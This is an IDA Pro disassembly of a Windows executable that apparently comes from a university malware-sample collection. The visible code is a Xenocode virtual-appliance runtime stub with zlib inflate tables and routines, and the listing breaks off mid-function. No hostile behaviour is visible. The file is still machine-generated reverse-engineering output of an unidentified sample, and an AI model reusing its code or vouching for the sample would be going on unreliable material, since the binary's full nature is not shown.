;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D454B2076A4AF6358EB5F3ECD8B7BF4
; Input	CRC32 :	17E7F63E

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\0d454b2076a4af6358eb5f3ecd8b7bf4
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00003C1A (  15386.)
; Section size in file		: 00003E00 (  15872.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 4ABCh, 4AC8h, 4ADAh,	4AE6h, 4AF6h, 4B0Ch, 4B22h, 4B36h
		dd 4B46h, 4B56h, 4B64h,	4B72h, 4B88h, 4B9Ah, 4BB8h, 4BC8h
		dd 4BD6h, 4BEAh, 4BFCh,	2 dup(0)
		dd 49B951C8h, 0
		dd 2, 47h, 2048h, 1448h, 0
word_401070	dw 30h			; DATA XREF: sub_4048F0+14r
		dw 31h
a23456789abcdef:
		unicode	0, <23456789ABCDEFGHIJKLMNOPQRSTUVWXYZ>,0
		align 4
a_xvm_mem_proce:			; DATA XREF: start+99o
		unicode	0, <_xvm_mem_process_info_0x>,0
		align 10h
a0x00020:				; DATA XREF: start+549o
		unicode	0, <0x00020: >,0
		align 8
aThereHasBeenAn:			; DATA XREF: sub_403F08+37o
					; sub_403F08+94o ...
		unicode	0, <There has been an error starting this virtual appliance. >
		unicode	0, < Error code: >,0
		align 4
a_xvm_mem_appli:			; DATA XREF: start+107o
		unicode	0, <_xvm_mem_application_info_0x>,0
		align 4
a0x00021:				; DATA XREF: start+565o
		unicode	0, <0x00021: >,0
a0x00022:				; DATA XREF: start:loc_404725o
		unicode	0, <0x00022: >,0
a0x00023:				; DATA XREF: start:loc_404877o
		unicode	0, <0x00023: >,0
asc_401210:				; DATA XREF: start+201o
		unicode	0, <, >,0
		align 4
a0x0003:				; DATA XREF: start+57Co
		unicode	0, <0x0003: >,0
		align 4
; WCHAR	Filename
Filename:				; DATA XREF: sub_403DBE+2o
		unicode	0, <			      >,0
		align 4
a0x00040:				; DATA XREF: start+589o
		unicode	0, <0x00040: >,0
a0x00050:				; DATA XREF: start+596o
		unicode	0, <0x00050: >,0
a0x00053:				; DATA XREF: start+5A3o
		unicode	0, <0x00053: >,0
a0x00051:				; DATA XREF: start+5B0o
		unicode	0, <0x00051: >,0
a0x00e00:				; DATA XREF: start+5C3o
		unicode	0, <0x00E00>,0
a0x00e01:				; DATA XREF: start+5D9o
		unicode	0, <0x00E01>,0
a0x00e1:				; DATA XREF: start+5EFo
		unicode	0, <0x00E1>,0
		align 4
a0x00e2:				; DATA XREF: start+605o
		unicode	0, <0x00E2>,0
		align 4
a0x00041:				; DATA XREF: start+615o
		unicode	0, <0x00041: >,0
a0x00052:				; DATA XREF: start+625o
		unicode	0, <0x00052: >,0
a0x00z1:				; DATA XREF: start+63Bo
		unicode	0, <0x00Z1>,0
		align 4
a0x00z2:				; DATA XREF: start+651o
		unicode	0, <0x00Z2>,0
		align 4
aRunvm		db 'RunVM',0            ; DATA XREF: sub_4049D8+9o
		align 4
a0x0006:				; DATA XREF: start+539o
		unicode	0, <0x0006>,0
		align 4
a0x00042:				; DATA XREF: start+685o
		unicode	0, <0x00042: >,0
; char aMessageboxw[]
aMessageboxw	db 'MessageBoxW',0      ; DATA XREF: start:loc_4048B5o
; const	WCHAR LibFileName
LibFileName:				; DATA XREF: start+701o
		unicode	0, <user32.dll>,0
		align 10h
aXenocodeVirtua:			; DATA XREF: start+715o
		unicode	0, <Xenocode Virtual Appliance Runtime>,0
		align 4
a0x0011:				; DATA XREF: sub_403F08+43o
		unicode	0, <0x0011>,0
		align 4
a0x0012:				; DATA XREF: sub_403F08+70o
		unicode	0, <0x0012: >,0
		align 4
a0x0013:				; DATA XREF: sub_403F08+1BEo
		unicode	0, <0x0013>,0
		align 4
a0x0014:				; DATA XREF: sub_403F08+28Ao
		unicode	0, <0x0014>,0
		align 4
a0x0015:				; DATA XREF: sub_403F08+2A2o
		unicode	0, <0x0015>,0
		align 4
; char ProcName[]
ProcName	db 'LdrGetProcedureAddress',0 ; DATA XREF: sub_403D85o
		align 4
; char ModuleName[]
ModuleName	db 'ntdll',0            ; DATA XREF: sub_403D85+5o
		align 10h
aInflate1_2_3Co	db ' inflate 1.2.3 Copyright 1995-2005 Mark Adler ',0
		align 10h
dword_401480	dd 40003h, 60005h, 80007h, 0A0009h, 0D000Bh, 11000Fh, 170013h
					; DATA XREF: sub_402090:loc_402290o
		dd 1F001Bh, 2B0023h, 3B0033h, 530043h, 730063h,	0A30083h
		dd 0E300C3h, 102h, 0
dword_4014C0	dd 4 dup(100010h), 2 dup(110011h), 2 dup(120012h), 2 dup(130013h)
					; DATA XREF: sub_402090+20Eo
		dd 2 dup(140014h), 2 dup(150015h), 0C90010h, 0C4h
dword_401500	dd 20001h, 40003h, 70005h, 0D0009h, 190011h, 310021h, 610041h
					; DATA XREF: sub_402090+1DFo
		dd 0C10081h, 1810101h, 3010201h, 6010401h, 0C010801h, 18011001h
		dd 30012001h, 60014001h, 0
dword_401540	dd 2 dup(100010h), 110011h, 120012h, 130013h, 140014h
					; DATA XREF: sub_402090+1E7o
		dd 150015h, 160016h, 170017h, 180018h, 190019h,	1A001Ah
		dd 1B001Bh, 1C001Ch, 1D001Dh, 400040h
		dd offset aNeedDictionary ; "need dictionary"
		dd offset dword_40202C
		dd offset byte_40202B
		dd offset aFileError	; "file	error"
		dd offset aStreamError	; "stream error"
		dd offset aDataError	; "data	error"
		dd offset aInsufficientMe ; "insufficient memory"
		dd offset aBufferError	; "buffer error"
		dd offset aIncompatibleVe ; "incompatible version"
		dd offset byte_40202B
dword_4015A8	dd 760h, 500800h, 100800h, 730814h, 1F0712h, 700800h, 300800h
					; DATA XREF: sub_402DA0o
		dd 0C00900h, 0A0710h, 600800h, 200800h,	0A00900h, 800h
		dd 800800h, 400800h, 0E00900h, 60710h, 580800h,	180800h
		dd 900900h, 3B0713h, 780800h, 380800h, 0D00900h, 110711h
		dd 680800h, 280800h, 0B00900h, 80800h, 880800h,	480800h
		dd 0F00900h, 40710h, 540800h, 140800h, 0E30815h, 2B0713h
		dd 740800h, 340800h, 0C80900h, 0D0711h,	640800h, 240800h
		dd 0A80900h, 40800h, 840800h, 440800h, 0E80900h, 80710h
		dd 5C0800h, 1C0800h, 980900h, 530714h, 7C0800h,	3C0800h
		dd 0D80900h, 170712h, 6C0800h, 2C0800h,	0B80900h, 0C0800h
		dd 8C0800h, 4C0800h, 0F80900h, 30710h, 520800h,	120800h
		dd 0A30815h, 230713h, 720800h, 320800h,	0C40900h, 0B0711h
		dd 620800h, 220800h, 0A40900h, 20800h, 820800h,	420800h
		dd 0E40900h, 70710h, 5A0800h, 1A0800h, 940900h,	430714h
		dd 7A0800h, 3A0800h, 0D40900h, 130712h,	6A0800h, 2A0800h
		dd 0B40900h, 0A0800h, 8A0800h, 4A0800h,	0F40900h, 50710h
		dd 560800h, 160800h, 840h, 330713h, 760800h, 360800h, 0CC0900h
		dd 0F0711h, 660800h, 260800h, 0AC0900h,	60800h,	860800h
		dd 460800h, 0EC0900h, 90710h, 5E0800h, 1E0800h,	9C0900h
		dd 630714h, 7E0800h, 3E0800h, 0DC0900h,	1B0712h, 6E0800h
		dd 2E0800h, 0BC0900h, 0E0800h, 8E0800h,	4E0800h, 0FC0900h
		dd 760h, 510800h, 110800h, 830815h, 1F0712h, 710800h, 310800h
		dd 0C20900h, 0A0710h, 610800h, 210800h,	0A20900h, 10800h
		dd 810800h, 410800h, 0E20900h, 60710h, 590800h,	190800h
		dd 920900h, 3B0713h, 790800h, 390800h, 0D20900h, 110711h
		dd 690800h, 290800h, 0B20900h, 90800h, 890800h,	490800h
		dd 0F20900h, 40710h, 550800h, 150800h, 1020810h, 2B0713h
		dd 750800h, 350800h, 0CA0900h, 0D0711h,	650800h, 250800h
		dd 0AA0900h, 50800h, 850800h, 450800h, 0EA0900h, 80710h
		dd 5D0800h, 1D0800h, 9A0900h, 530714h, 7D0800h,	3D0800h
		dd 0DA0900h, 170712h, 6D0800h, 2D0800h,	0BA0900h, 0D0800h
		dd 8D0800h, 4D0800h, 0FA0900h, 30710h, 530800h,	130800h
		dd 0C30815h, 230713h, 730800h, 330800h,	0C60900h, 0B0711h
		dd 630800h, 230800h, 0A60900h, 30800h, 830800h,	430800h
		dd 0E60900h, 70710h, 5B0800h, 1B0800h, 960900h,	430714h
		dd 7B0800h, 3B0800h, 0D60900h, 130712h,	6B0800h, 2B0800h
		dd 0B60900h, 0B0800h, 8B0800h, 4B0800h,	0F60900h, 50710h
		dd 570800h, 170800h, 840h, 330713h, 770800h, 370800h, 0CE0900h
		dd 0F0711h, 670800h, 270800h, 0AE0900h,	70800h,	870800h
		dd 470800h, 0EE0900h, 90710h, 5F0800h, 1F0800h,	9E0900h
		dd 630714h, 7F0800h, 3F0800h, 0DE0900h,	1B0712h, 6F0800h
		dd 2F0800h, 0BE0900h, 0F0800h, 8F0800h,	4F0800h, 0FE0900h
		dd 760h, 500800h, 100800h, 730814h, 1F0712h, 700800h, 300800h
		dd 0C10900h, 0A0710h, 600800h, 200800h,	0A10900h, 800h
		dd 800800h, 400800h, 0E10900h, 60710h, 580800h,	180800h
		dd 910900h, 3B0713h, 780800h, 380800h, 0D10900h, 110711h
		dd 680800h, 280800h, 0B10900h, 80800h, 880800h,	480800h
		dd 0F10900h, 40710h, 540800h, 140800h, 0E30815h, 2B0713h
		dd 740800h, 340800h, 0C90900h, 0D0711h,	640800h, 240800h
		dd 0A90900h, 40800h, 840800h, 440800h, 0E90900h, 80710h
		dd 5C0800h, 1C0800h, 990900h, 530714h, 7C0800h,	3C0800h
		dd 0D90900h, 170712h, 6C0800h, 2C0800h,	0B90900h, 0C0800h
		dd 8C0800h, 4C0800h, 0F90900h, 30710h, 520800h,	120800h
		dd 0A30815h, 230713h, 720800h, 320800h,	0C50900h, 0B0711h
		dd 620800h, 220800h, 0A50900h, 20800h, 820800h,	420800h
		dd 0E50900h, 70710h, 5A0800h, 1A0800h, 950900h,	430714h
		dd 7A0800h, 3A0800h, 0D50900h, 130712h,	6A0800h, 2A0800h
		dd 0B50900h, 0A0800h, 8A0800h, 4A0800h,	0F50900h, 50710h
		dd 560800h, 160800h, 840h, 330713h, 760800h, 360800h, 0CD0900h
		dd 0F0711h, 660800h, 260800h, 0AD0900h,	60800h,	860800h
		dd 460800h, 0ED0900h, 90710h, 5E0800h, 1E0800h,	9D0900h
		dd 630714h, 7E0800h, 3E0800h, 0DD0900h,	1B0712h, 6E0800h
		dd 2E0800h, 0BD0900h, 0E0800h, 8E0800h,	4E0800h, 0FD0900h
		dd 760h, 510800h, 110800h, 830815h, 1F0712h, 710800h, 310800h
		dd 0C30900h, 0A0710h, 610800h, 210800h,	0A30900h, 10800h
		dd 810800h, 410800h, 0E30900h, 60710h, 590800h,	190800h
		dd 930900h, 3B0713h, 790800h, 390800h, 0D30900h, 110711h
		dd 690800h, 290800h, 0B30900h, 90800h, 890800h,	490800h
		dd 0F30900h, 40710h, 550800h, 150800h, 1020810h, 2B0713h
		dd 750800h, 350800h, 0CB0900h, 0D0711h,	650800h, 250800h
		dd 0AB0900h, 50800h, 850800h, 450800h, 0EB0900h, 80710h
		dd 5D0800h, 1D0800h, 9B0900h, 530714h, 7D0800h,	3D0800h
		dd 0DB0900h, 170712h, 6D0800h, 2D0800h,	0BB0900h, 0D0800h
		dd 8D0800h, 4D0800h, 0FB0900h, 30710h, 530800h,	130800h
		dd 0C30815h, 230713h, 730800h, 330800h,	0C70900h, 0B0711h
		dd 630800h, 230800h, 0A70900h, 30800h, 830800h,	430800h
		dd 0E70900h, 70710h, 5B0800h, 1B0800h, 970900h,	430714h
		dd 7B0800h, 3B0800h, 0D70900h, 130712h,	6B0800h, 2B0800h
		dd 0B70900h, 0B0800h, 8B0800h, 4B0800h,	0F70900h, 50710h
		dd 570800h, 170800h, 840h, 330713h, 770800h, 370800h, 0CF0900h
		dd 0F0711h, 670800h, 270800h, 0AF0900h,	70800h,	870800h
		dd 470800h, 0EF0900h, 90710h, 5F0800h, 1F0800h,	9F0900h
		dd 630714h, 7F0800h, 3F0800h, 0DF0900h,	1B0712h, 6F0800h
		dd 2F0800h, 0BF0900h, 0F0800h, 8F0800h,	4F0800h, 0FF0900h
dword_401DA8	dd 10510h, 1010517h, 110513h, 1001051Bh, 50511h, 4010519h
					; DATA XREF: sub_402DA0+Eo
		dd 410515h, 4001051Dh, 30510h, 2010518h, 210514h, 2001051Ch
		dd 90512h, 801051Ah, 810516h, 540h, 20510h, 1810517h, 190513h
		dd 1801051Bh, 70511h, 6010519h,	610515h, 6001051Dh, 40510h
		dd 3010518h, 310514h, 3001051Ch, 0D0512h, 0C01051Ah, 0C10516h
		dd 540h
word_401E28	dw 10h			; DATA XREF: sub_402E20+408r
					; sub_402E20+443r
		dw 11h
		dd 12h,	70008h,	60009h,	5000Ah,	4000Bh,	3000Ch,	2000Dh
		dd 1000Eh, 0Fh
aIncorrectHeade	db 'incorrect header check',0 ; DATA XREF: sub_402E20+DFo
		align 4
aUnknownCompres	db 'unknown compression method',0 ; DATA XREF: sub_402E20+FFo
		align 4
aInvalidWindowS	db 'invalid window size',0 ; DATA XREF: sub_402E20+122o
aInvalidBlockTy	db 'invalid block type',0 ; DATA XREF: sub_402E20+28Ao
		align 4
aInvalidStoredB	db 'invalid stored block lengths',0 ; DATA XREF: sub_402E20+2E6o
		align 4
aTooManyLengthO	db 'too many length or distance symbols',0 ; DATA XREF: sub_402E20+4AAo
aInvalidCodeLen	db 'invalid code lengths set',0 ; DATA XREF: sub_402E20+49Ao
		align 4
aInvalidBitLeng	db 'invalid bit length repeat',0 ; DATA XREF: sub_402E20+741o
					; sub_402E20+751o
		align 4
aInvalidLiteral	db 'invalid literal/lengths set',0 ; DATA XREF: sub_402E20+72Do
aInvalidDistanc	db 'invalid distances set',0 ; DATA XREF: sub_402E20+7A2o
		align 4
aInvalidLiter_0	db 'invalid literal/length code',0 ; DATA XREF: sub_4025D0+3EFo
					; sub_402E20+985o
aInvalidDista_1	db 'invalid distance code',0 ; DATA XREF: sub_4025D0+3D1o
					; sub_402E20+B26o
		align 10h
aInvalidDista_0	db 'invalid distance too far back',0 ; DATA XREF: sub_4025D0+3BEo
					; sub_402E20+B9Co
		align 10h
aIncorrectDataC	db 'incorrect data check',0 ; DATA XREF: sub_402E20+D2Co
		align 4
aIncompatibleVe	db 'incompatible version',0 ; DATA XREF: .text:004015A0o
		align 10h
aBufferError	db 'buffer error',0     ; DATA XREF: .text:0040159Co
		align 10h
aInsufficientMe	db 'insufficient memory',0 ; DATA XREF: .text:00401598o
aDataError	db 'data error',0       ; DATA XREF: .text:00401594o
		align 10h
aStreamError	db 'stream error',0     ; DATA XREF: .text:00401590o
		align 10h
aFileError	db 'file error',0       ; DATA XREF: .text:0040158Co
byte_40202B	db 0			; DATA XREF: .text:00401588o
					; .text:004015A4o
dword_40202C	dd 65727473h, 65206D61h, 646Eh ; DATA XREF: .text:00401584o
aNeedDictionary	db 'need dictionary',0  ; DATA XREF: .text:00401580o
		dd 53445352h, 870AE4C1h, 4DD4CD07h, 7D5438A2h, 39A34555h
		dd 1
aCXroot_buildX7	db 'c:\XRoot_Build\X7.0\Vm\Release\x86\StubExe.pdb',0
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_402090	proc near		; CODE XREF: sub_402E20+482p
					; sub_402E20+719p ...

var_7C		= dword	ptr -7Ch
var_78		= dword	ptr -78h
var_74		= dword	ptr -74h
var_70		= dword	ptr -70h
var_6C		= dword	ptr -6Ch
var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= word ptr -20h
var_1E		= word ptr -1Eh
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h
arg_10		= dword	ptr  14h
arg_14		= dword	ptr  18h

		sub	esp, 7Ch
		mov	edx, [esp+7Ch+arg_10]
		xor	eax, eax
		movzx	ecx, ax
		push	ebx
		mov	eax, ecx
		push	ebp
		mov	ebp, [esp+84h+arg_4]
		shl	ecx, 10h
		or	eax, ecx
		push	esi
		mov	esi, [esp+88h+arg_8]
		mov	[esp+88h+var_40], eax
		mov	[esp+88h+var_3C], eax
		mov	[esp+88h+var_38], eax
		mov	[esp+88h+var_34], eax
		mov	[esp+88h+var_30], eax
		mov	[esp+88h+var_2C], eax
		mov	[esp+88h+var_28], eax
		mov	[esp+88h+var_24], eax
		xor	eax, eax
		push	edi
		mov	edi, [esp+8Ch+arg_C]
		test	esi, esi
		jbe	short loc_402103
		jmp	short loc_4020F0
; ---------------------------------------------------------------------------
		align 10h

loc_4020F0:				; CODE XREF: sub_402090+55j
					; sub_402090+71j
		movzx	ecx, word ptr [ebp+eax*2+0]
		inc	word ptr [esp+ecx*2+8Ch+var_40]
		lea	ecx, [esp+ecx*2+8Ch+var_40]
		inc	eax
		cmp	eax, esi
		jb	short loc_4020F0

loc_402103:				; CODE XREF: sub_402090+53j
		mov	eax, [edx]
		mov	[esp+8Ch+var_78], eax
		mov	ebx, 0Fh
		mov	edi, edi

loc_402110:				; CODE XREF: sub_402090+8Cj
		cmp	word ptr [esp+ebx*2+8Ch+var_40], 0
		jnz	short loc_40211E
		dec	ebx
		cmp	ebx, 1
		jnb	short loc_402110

loc_40211E:				; CODE XREF: sub_402090+86j
		mov	[esp+8Ch+var_70], ebx
		cmp	eax, ebx
		jbe	short loc_40212C
		mov	[esp+8Ch+var_78], ebx
		mov	eax, ebx

loc_40212C:				; CODE XREF: sub_402090+94j
		test	ebx, ebx
		jnz	short loc_402163
		mov	ecx, [edi]
		xor	eax, eax
		mov	word ptr [esp+8Ch+var_7C+2], ax
		mov	byte ptr [esp+8Ch+var_7C], 40h
		mov	byte ptr [esp+8Ch+var_7C+1], 1
		mov	eax, [esp+8Ch+var_7C]
		mov	[ecx], eax
		add	dword ptr [edi], 4
		mov	ecx, [edi]
		mov	[ecx], eax
		add	dword ptr [edi], 4
		pop	edi
		pop	esi
		pop	ebp
		mov	dword ptr [edx], 1
		xor	eax, eax
		pop	ebx
		add	esp, 7Ch
		retn
; ---------------------------------------------------------------------------

loc_402163:				; CODE XREF: sub_402090+9Ej
		mov	esi, 1

loc_402168:				; CODE XREF: sub_402090+106j
		cmp	word ptr [esp+esi*2+8Ch+var_40], 0
		jnz	short loc_4021AA
		cmp	word ptr [esp+esi*2+8Ch+var_40+2], 0
		jnz	short loc_40219A
		cmp	word ptr [esp+esi*2+8Ch+var_3C], 0
		jnz	short loc_40219D
		cmp	word ptr [esp+esi*2+8Ch+var_3C+2], 0
		jnz	short loc_4021A2
		cmp	word ptr [esp+esi*2+8Ch+var_38], 0
		jnz	short loc_4021A7
		add	esi, 5
		cmp	esi, 0Fh
		jbe	short loc_402168
		jmp	short loc_4021AA
; ---------------------------------------------------------------------------

loc_40219A:				; CODE XREF: sub_402090+E6j
		inc	esi
		jmp	short loc_4021AA
; ---------------------------------------------------------------------------

loc_40219D:				; CODE XREF: sub_402090+EEj
		add	esi, 2
		jmp	short loc_4021AA
; ---------------------------------------------------------------------------

loc_4021A2:				; CODE XREF: sub_402090+F6j
		add	esi, 3
		jmp	short loc_4021AA
; ---------------------------------------------------------------------------

loc_4021A7:				; CODE XREF: sub_402090+FEj
		add	esi, 4

loc_4021AA:				; CODE XREF: sub_402090+DEj
					; sub_402090+108j ...
		cmp	eax, esi
		jnb	short loc_4021B2
		mov	[esp+8Ch+var_78], esi

loc_4021B2:				; CODE XREF: sub_402090+11Cj
		mov	edx, 1
		mov	eax, edx
		lea	esp, [esp+0]

loc_4021C0:				; CODE XREF: sub_402090+143j
		movzx	ecx, word ptr [esp+eax*2+8Ch+var_40]
		add	edx, edx
		sub	edx, ecx
		js	loc_402285
		inc	eax
		cmp	eax, 0Fh
		jbe	short loc_4021C0
		test	edx, edx
		jle	short loc_4021F0
		cmp	[esp+8Ch+arg_0], 0
		jz	loc_402285
		cmp	ebx, 1
		jnz	loc_402285

loc_4021F0:				; CODE XREF: sub_402090+147j
		xor	eax, eax
		mov	[esp+8Ch+var_1E], ax
		mov	eax, 2
		lea	esp, [esp+0]

loc_402200:				; CODE XREF: sub_402090+185j
		mov	cx, [esp+eax+8Ch+var_20]
		add	cx, word ptr [esp+eax+8Ch+var_40]
		add	eax, 2
		mov	[esp+eax+8Ch+var_20], cx
		cmp	eax, 1Eh
		jb	short loc_402200
		mov	ebx, [esp+8Ch+arg_8]
		mov	ecx, [esp+8Ch+arg_14]
		xor	eax, eax
		test	ebx, ebx
		jbe	short loc_402259
		jmp	short loc_402230
; ---------------------------------------------------------------------------
		align 10h

loc_402230:				; CODE XREF: sub_402090+19Bj
					; sub_402090+1C7j
		cmp	word ptr [ebp+eax*2+0],	0
		jz	short loc_402254
		movzx	edx, word ptr [ebp+eax*2+0]
		movzx	edx, [esp+edx*2+8Ch+var_20]
		mov	[ecx+edx*2], ax
		movzx	edx, word ptr [ebp+eax*2+0]
		inc	[esp+edx*2+8Ch+var_20]
		lea	edx, [esp+edx*2+8Ch+var_20]

loc_402254:				; CODE XREF: sub_402090+1A6j
		inc	eax
		cmp	eax, ebx
		jb	short loc_402230

loc_402259:				; CODE XREF: sub_402090+199j
		mov	eax, [esp+8Ch+arg_0]
		sub	eax, 0
		mov	edx, 0FFFFFFFFh
		jz	short loc_4022B6
		sub	eax, 1
		jz	short loc_402290
		mov	[esp+8Ch+var_58], offset dword_401500
		mov	[esp+8Ch+var_5C], offset dword_401540
		mov	[esp+8Ch+var_60], edx
		jmp	short loc_4022C6
; ---------------------------------------------------------------------------

loc_402285:				; CODE XREF: sub_402090+139j
					; sub_402090+151j ...
		pop	edi
		pop	esi
		pop	ebp
		or	eax, 0FFFFFFFFh
		pop	ebx
		add	esp, 7Ch
		retn
; ---------------------------------------------------------------------------

loc_402290:				; CODE XREF: sub_402090+1DDj
		mov	eax, offset dword_401480
		sub	eax, 202h
		mov	[esp+8Ch+var_58], eax
		mov	eax, offset dword_4014C0
		sub	eax, 202h
		mov	[esp+8Ch+var_5C], eax
		mov	[esp+8Ch+var_60], 100h
		jmp	short loc_4022C6
; ---------------------------------------------------------------------------

loc_4022B6:				; CODE XREF: sub_402090+1D8j
		mov	[esp+8Ch+var_5C], ecx
		mov	[esp+8Ch+var_58], ecx
		mov	[esp+8Ch+var_60], 13h

loc_4022C6:				; CODE XREF: sub_402090+1F3j
					; sub_402090+224j
		mov	eax, [edi]
		mov	ecx, [esp+8Ch+var_78]
		mov	[esp+8Ch+var_6C], eax
		mov	eax, 1
		shl	eax, cl
		xor	ebp, ebp
		xor	ebx, ebx
		cmp	[esp+8Ch+arg_0], 1
		lea	ecx, [eax-1]
		mov	[esp+8Ch+var_74], esi
		mov	[esp+8Ch+var_54], edx
		mov	[esp+8Ch+var_50], eax
		mov	[esp+8Ch+var_64], eax
		mov	[esp+8Ch+var_4C], ecx
		jnz	short loc_402307
		cmp	eax, 5B0h
		jnb	loc_40255C

loc_402307:				; CODE XREF: sub_402090+26Aj
		mov	edx, [esp+8Ch+arg_14]
		mov	[esp+8Ch+var_68], edx

loc_402312:				; CODE XREF: sub_402090+376j
					; sub_402090+38Aj ...
		mov	al, byte ptr [esp+8Ch+var_74]
		mov	esi, [esp+8Ch+var_68]
		mov	edx, [esp+8Ch+var_60]
		sub	al, bl
		mov	byte ptr [esp+8Ch+var_7C+1], al
		movzx	eax, word ptr [esi]
		movzx	ecx, ax
		cmp	ecx, edx
		jge	short loc_402335
		mov	byte ptr [esp+8Ch+var_7C], 0
		jmp	short loc_40235D
; ---------------------------------------------------------------------------

loc_402335:				; CODE XREF: sub_402090+29Cj
		jle	short loc_402356
		movzx	eax, word ptr [esi]
		mov	ecx, [esp+8Ch+var_5C]
		add	eax, eax
		mov	dl, [eax+ecx]
		mov	ecx, [esp+8Ch+var_58]
		mov	byte ptr [esp+8Ch+var_7C], dl
		mov	dx, [eax+ecx]
		mov	word ptr [esp+8Ch+var_7C+2], dx
		jmp	short loc_402362
; ---------------------------------------------------------------------------

loc_402356:				; CODE XREF: sub_402090:loc_402335j
		mov	byte ptr [esp+8Ch+var_7C], 60h
		xor	eax, eax

loc_40235D:				; CODE XREF: sub_402090+2A3j
		mov	word ptr [esp+8Ch+var_7C+2], ax

loc_402362:				; CODE XREF: sub_402090+2C4j
		mov	ecx, [esp+8Ch+var_74]
		mov	eax, [esp+8Ch+var_50]
		sub	ecx, ebx
		mov	edx, 1
		shl	edx, cl
		mov	ecx, ebx
		mov	edi, ebp
		shr	edi, cl
		mov	ecx, [esp+8Ch+var_6C]
		mov	[esp+8Ch+var_48], eax
		lea	esi, ds:0[edx*4]
		add	edi, eax
		lea	ecx, [ecx+edi*4]
		mov	edi, [esp+8Ch+var_7C]

loc_402391:				; CODE XREF: sub_402090+309j
		sub	eax, edx
		sub	ecx, esi
		mov	[ecx], edi
		test	eax, eax
		jnz	short loc_402391
		mov	edx, [esp+8Ch+var_74]
		lea	ecx, [edx-1]
		mov	eax, 1
		shl	eax, cl
		test	ebp, eax
		jz	short loc_4023B6
		lea	ecx, [ecx+0]

loc_4023B0:				; CODE XREF: sub_402090+324j
		shr	eax, 1
		test	ebp, eax
		jnz	short loc_4023B0

loc_4023B6:				; CODE XREF: sub_402090+31Bj
		test	eax, eax
		jz	short loc_4023C5
		lea	ecx, [eax-1]
		and	ecx, ebp
		add	ecx, eax
		mov	ebp, ecx
		jmp	short loc_4023C7
; ---------------------------------------------------------------------------

loc_4023C5:				; CODE XREF: sub_402090+328j
		xor	ebp, ebp

loc_4023C7:				; CODE XREF: sub_402090+333j
		add	[esp+8Ch+var_68], 2
		mov	eax, 0FFFFh
		add	word ptr [esp+edx*2+8Ch+var_40], ax
		movzx	eax, word ptr [esp+edx*2+8Ch+var_40]
		test	ax, ax
		jnz	short loc_402402
		cmp	edx, [esp+8Ch+var_70]
		jz	loc_4024C3
		mov	ecx, [esp+8Ch+var_68]
		movzx	edx, word ptr [ecx]
		mov	eax, [esp+8Ch+arg_4]
		movzx	ecx, word ptr [eax+edx*2]
		mov	[esp+8Ch+var_74], ecx
		mov	edx, ecx

loc_402402:				; CODE XREF: sub_402090+34Ej
		cmp	edx, [esp+8Ch+var_78]
		jbe	loc_402312
		mov	esi, [esp+8Ch+var_4C]
		and	esi, ebp
		mov	[esp+8Ch+var_44], esi
		cmp	esi, [esp+8Ch+var_54]
		jz	loc_402312
		test	ebx, ebx
		jnz	short loc_402428
		mov	ebx, [esp+8Ch+var_78]

loc_402428:				; CODE XREF: sub_402090+392j
		mov	edx, [esp+8Ch+var_6C]
		mov	eax, [esp+8Ch+var_48]
		lea	ecx, [edx+eax*4]
		mov	[esp+8Ch+var_6C], ecx
		mov	ecx, [esp+8Ch+var_74]
		sub	ecx, ebx
		mov	eax, 1
		lea	edx, [ebx+ecx]
		shl	eax, cl
		cmp	edx, [esp+8Ch+var_70]
		jnb	short loc_40246B
		lea	esi, [esp+edx*2+8Ch+var_40]

loc_402451:				; CODE XREF: sub_402090+3D5j
		movzx	edi, word ptr [esi]
		sub	eax, edi
		test	eax, eax
		jle	short loc_402467
		inc	edx
		inc	ecx
		add	esi, 2
		add	eax, eax
		cmp	edx, [esp+8Ch+var_70]
		jb	short loc_402451

loc_402467:				; CODE XREF: sub_402090+3C8j
		mov	esi, [esp+8Ch+var_44]

loc_40246B:				; CODE XREF: sub_402090+3BBj
		mov	eax, 1
		shl	eax, cl
		add	[esp+8Ch+var_64], eax
		cmp	[esp+8Ch+arg_0], 1
		mov	[esp+8Ch+var_50], eax
		jnz	short loc_402492
		cmp	[esp+8Ch+var_64], 5B0h
		jnb	loc_40255C

loc_402492:				; CODE XREF: sub_402090+3F2j
		mov	edx, esi
		mov	esi, [esp+8Ch+arg_C]
		mov	eax, [esi]
		mov	[eax+edx*4], cl
		mov	ecx, [esi]
		mov	al, byte ptr [esp+8Ch+var_78]
		mov	[ecx+edx*4+1], al
		mov	eax, [esi]
		mov	ecx, [esp+8Ch+var_6C]
		sub	ecx, eax
		sar	ecx, 2
		mov	[esp+8Ch+var_54], edx
		mov	[eax+edx*4+2], cx
		jmp	loc_402312
; ---------------------------------------------------------------------------

loc_4024C3:				; CODE XREF: sub_402090+354j
